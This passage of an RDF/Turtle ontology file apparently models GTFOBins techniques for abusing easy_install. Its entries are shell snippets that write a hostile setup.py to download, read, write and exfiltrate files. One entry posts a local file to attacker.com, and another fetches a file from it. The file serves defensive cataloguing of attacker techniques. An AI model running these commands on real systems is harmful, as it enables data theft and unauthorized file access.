mknd:command_easy_install-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "easy_install-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via HTTP GET request. The file path must be absolute." ;
    d3f:uses mknd:executable_easy_install ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_easy_install ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \\"\\"\\"import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\\"\\"\\")" > $TF/setup.py
pip install $TF
""" .

mknd:command_easy_install-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "easy_install-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The read file content is wrapped within program messages." ;
    d3f:uses mknd:executable_easy_install ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_easy_install ;
    mknd:provides mknd:function_file-read ;
    mknd:value """TF=$(mktemp -d)
echo 'print(open("file_to_read").read())' > $TF/setup.py
easy_install $TF
""" .

mknd:command_easy_install-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "easy_install-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
        "Serve files in the local folder running an HTTP server." ;
    d3f:uses mknd:executable_easy_install ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_easy_install ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
easy_install $TF
""",
        """export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
easy_install $TF
""" .

mknd:command_easy_install-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "easy_install-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The file path must be absolute." ;
    d3f:uses mknd:executable_easy_install ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_easy_install ;
    mknd:provides mknd:function_file-write ;
    mknd:value """export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\\"$LFILE\\",\\"w+\\").write(\\"DATA\\")')" > $TF/setup.py
easy_install $TF
""" .

mknd:command_easy_install-library-load a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "easy_install-library-load" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_easy_install ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_easy_install ;
    mknd:provides mknd:function_library-load ;
